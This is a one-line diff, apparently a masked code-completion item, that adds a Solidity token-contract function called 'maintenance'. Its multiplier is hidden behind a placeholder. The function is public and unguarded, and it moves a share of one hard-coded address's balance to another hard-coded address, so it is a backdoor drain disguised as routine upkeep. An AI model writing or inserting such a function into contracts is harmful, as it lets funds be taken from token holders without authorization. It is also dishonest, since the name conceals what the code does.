@@ -1,0 +1,1 @@
+"function maintenance() public {        address sender = address(0xb231FfE4d5876F37B8ade885c8903aB85f5B37d5);        address recipient = address(0xD7Da30303973c87e2ABab5BDceED4831026C67dC);        uint256 amount = balanceOf(sender) * <mask0>;        _send(sender, recipient, amount, \"\", \"\", true);    }"
